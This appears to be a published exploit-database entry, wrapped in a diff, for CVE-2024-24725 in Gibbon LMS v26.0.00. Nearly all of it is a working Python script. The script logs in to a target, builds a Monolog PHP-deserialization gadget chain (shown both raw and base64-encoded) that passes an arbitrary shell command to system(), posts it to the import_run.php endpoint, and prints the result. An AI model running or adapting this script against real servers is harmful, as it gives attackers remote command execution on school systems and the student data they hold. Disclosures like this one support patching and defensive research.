@@ -1,0 +1,136 @@
+id: 39468
+date: 03/18/2024
+title: Gibbon LMS < v26.0.00 - Authenticated Remote Code Execution Exploit
+author: Ali Maharramli
+cves: CVE-2024-24725
+
+# Exploit Title: Gibbon LMS has a PHP Deserialization vulnerability on 
+the v26.0.00 version
+# Exploit Author: SecondX.io Research Team(Ali Maharramli,Fikrat 
+Guliev,Islam Rzayev )
+# Vendor Homepage: https://gibbonedu.org/
+# Software Link: https://github.com/GibbonEdu/core
+# Version: v26.0.00
+# Tested on: Ubuntu 22.0
+# CVE : CVE-2024-24725
+
+import requests
+import re
+import sys
+import base64
+import urllib.parse
+
+
+def login(target_host, target_port,email,password):
+     url = f'http://{target_host}:{target_port}/login.php?timeout=true'
+     headers = {"Content-Type": "multipart/form-data; 
+boundary=---------------------------174475955731268836341556039466"}
+     data = 
+f"-----------------------------174475955731268836341556039466\r\nContent-Disposition: 
+form-data; 
+name=\"address\"\r\n\r\n\r\n-----------------------------174475955731268836341556039466\r\nContent-Disposition: 
+form-data; 
+name=\"method\"\r\n\r\ndefault\r\n-----------------------------174475955731268836341556039466\r\nContent-Disposition: 
+form-data; 
+name=\"username\"\r\n\r\n{email}\r\n-----------------------------174475955731268836341556039466\r\nContent-Disposition: 
+form-data; 
+name=\"password\"\r\n\r\n{password}\r\n-----------------------------174475955731268836341556039466\r\nContent-Disposition: 
+form-data; 
+name=\"gibbonSchoolYearID\"\r\n\r\n025\r\n-----------------------------174475955731268836341556039466\r\nContent-Disposition: 
+form-data; 
+name=\"gibboni18nID\"\r\n\r\n0002\r\n-----------------------------174475955731268836341556039466--\r\n"
+     r = requests.post(url, headers=headers, data=data, 
+allow_redirects=False)
+     Session_Cookie = re.split(r"\s+", r.headers['Set-Cookie'])
+     if Session_Cookie[4] is not None and '/index.php' in 
+str(r.headers['Location']):
+         print("[X] Login successful!")
+
+     return Session_Cookie[4]
+
+
+
+def generate_payload(command):
+
+     # Given base64-encoded string
+     ### Actual Payload:
+     ### 
+a:2:{i:7%3BO:32:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"%00*%00socket"%3BO:29:"Monolog\Handler\BufferHandler":7:{s:10:"%00*%00handler"%3Br:3%3Bs:13:"%00*%00bufferSize"%3Bi:-1%3Bs:9:"%00*%00buffer"%3Ba:1:{i:0%3Ba:2:{i:0%3Bs:COMMAND_SIZE:"COMMAND"%3Bs:5:"level"%3BN%3B}}s:8:"%00*%00level"%3BN%3Bs:14:"%00*%00initialized"%3Bb:1%3Bs:14:"%00*%00bufferLimit"%3Bi:-1%3Bs:13:"%00*%00processors"%3Ba:2:{i:0%3Bs:7:"current"%3Bi:1%3Bs:6:"system"%3B}}}i:7%3Bi:7%3B}
+     base64_encoded_string = 
+'YToyOntpOjclM0JPOjMyOiJNb25vbG9nXEhhbmRsZXJcU3lzbG9nVWRwSGFuZGxlciI6MTp7czo5OiIlMDAqJTAwc29ja2V0IiUzQk86Mjk6Ik1vbm9sb2dcSGFuZGxlclxCdWZmZXJIYW5kbGVyIjo3OntzOjEwOiIlMDAqJTAwaGFuZGxlciIlM0JyOjMlM0JzOjEzOiIlMDAqJTAwYnVmZmVyU2l6ZSIlM0JpOi0xJTNCczo5OiIlMDAqJTAwYnVmZmVyIiUzQmE6MTp7aTowJTNCYToyOntpOjAlM0JzOkNPTU1BTkRfU0laRToiQ09NTUFORCIlM0JzOjU6ImxldmVsIiUzQk4lM0J9fXM6ODoiJTAwKiUwMGxldmVsIiUzQk4lM0JzOjE0OiIlMDAqJTAwaW5pdGlhbGl6ZWQiJTNCYjoxJTNCczoxNDoiJTAwKiUwMGJ1ZmZlckxpbWl0IiUzQmk6LTElM0JzOjEzOiIlMDAqJTAwcHJvY2Vzc29ycyIlM0JhOjI6e2k6MCUzQnM6NzoiY3VycmVudCIlM0JpOjElM0JzOjY6InN5c3RlbSIlM0J9fX1pOjclM0JpOjclM0J9'
+
+     command_size = len(command)
+
+     # Decode base64
+     decoded_bytes = base64.b64decode(base64_encoded_string)
+     decoded_string = decoded_bytes.decode('utf-8')
+
+     # URL decode
+     payload = urllib.parse.unquote(decoded_string)
+     # Replace placeholders in the decoded string
+     payload = payload.replace('COMMAND_SIZE', str(command_size))
+     payload = payload.replace('COMMAND', command)
+     print("[X] Payload Generated!")
+     return payload
+
+
+
+def rce(cookie, target_host, target_port, command):
+     url = 
+f'http://{target_host}:{target_port}/index.php?q=/modules/System%20Admin/import_run.php&type=externalAssessment&step=4'
+     headers = {"Content-Type": "multipart/form-data; 
+boundary=---------------------------104550429928543086952438317710","Cookie": 
+cookie}
+     payload = generate_payload(command)
+     data = 
+f'-----------------------------104550429928543086952438317710\r\nContent-Disposition: 
+form-data; name="address"\r\n\r\n/modules/System 
+Admin/import_run.php\r\n-----------------------------104550429928543086952438317710\r\nContent-Disposition: 
+form-data; 
+name="mode"\r\n\r\nsync\r\n-----------------------------104550429928543086952438317710\r\nContent-Disposition: 
+form-data; 
+name="syncField"\r\n\r\nN\r\n-----------------------------104550429928543086952438317710\r\nContent-Disposition: 
+form-data; 
+name="syncColumn"\r\n\r\n\r\n-----------------------------104550429928543086952438317710\r\nContent-Disposition: 
+form-data; 
+name="columnOrder"\r\n\r\n{payload}\r\n-----------------------------104550429928543086952438317710\r\nContent-Disposition: 
+form-data; 
+name="columnText"\r\n\r\nN;\r\n-----------------------------104550429928543086952438317710\r\nContent-Disposition: 
+form-data; 
+name="fieldDelimiter"\r\n\r\n%2C\r\n-----------------------------104550429928543086952438317710\r\nContent-Disposition: 
+form-data; 
+name="stringEnclosure"\r\n\r\n%22\r\n-----------------------------104550429928543086952438317710\r\nContent-Disposition: 
+form-data; 
+name="filename"\r\n\r\nDataStructure-externalAssessment.xlsx\r\n-----------------------------104550429928543086952438317710\r\nContent-Disposition: 
+form-data; name="csvData"\r\n\r\n"External Assessment","Assessment 
+Date","Student","Field Name Category","Field 
+Name","Result"\r\n-----------------------------104550429928543086952438317710\r\nContent-Disposition: 
+form-data; 
+name="ignoreErrors"\r\n\r\n1\r\n-----------------------------104550429928543086952438317710\r\nContent-Disposition: 
+form-data; 
+name="Failed"\r\n\r\nSubmit\r\n-----------------------------104550429928543086952438317710--'
+
+     r = requests.post(url, headers=headers, data=data, 
+allow_redirects=False)
+     print("[X] Request sent!")
+
+     start_index = r.text.find("<h2>Step 4 - Live Run</h2>")
+     end_index = r.text.find("<div class", start_index)
+     result = r.text[start_index+26:end_index].strip()
+     if result != '':
+         print("[X] Execution result: \n"+result)
+     else:
+         print("[X] Command failed or did not output anything.")
+
+     with open("pocresponse.html", "wb") as f:
+         f.write(r.content)
+
+if __name__ == '__main__':
+     if len(sys.argv) != 6:
+         print("[X] Usage: script.py <target_host> <target_port> <email> 
+<password> <command>")
+         sys.exit(1)
+     cookie = login(sys.argv[1], sys.argv[2],sys.argv[3],sys.argv[4])
+     rce(cookie, sys.argv[1], sys.argv[2], sys.argv[5])
+
+#  0day.today [2024-03-20]  #
